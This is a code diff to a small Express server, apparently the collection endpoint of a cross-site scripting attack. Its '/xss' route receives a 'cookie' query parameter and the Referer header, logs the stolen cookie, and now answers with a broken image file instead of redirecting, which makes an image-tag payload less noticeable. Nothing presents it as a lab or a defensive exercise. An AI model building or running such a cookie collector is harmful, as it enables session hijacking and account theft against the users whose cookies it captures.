@@ -1,8 +1,12 @@
 import express from 'express';
 import logCookie from './logger';
+import path from 'path';
 
 const app = express();
 const port = 4000;
+
+const brokenImagePath = path.join(__dirname, '../src/img/image.jpeg');
+
 
 app.get('/xss', (req, res) => {
     const cookieValue = req.query.cookie; 
@@ -10,7 +14,9 @@ app.get('/xss', (req, res) => {
     if(cookieValue && referer ){
         logCookie(cookieValue.toString(), referer)
         console.log('Received cookie:', cookieValue); 
-        res.redirect(referer);
+        // console.log(req)
+        // res.redirect(referer);
+        res.sendFile(brokenImagePath)
     }
 })
 
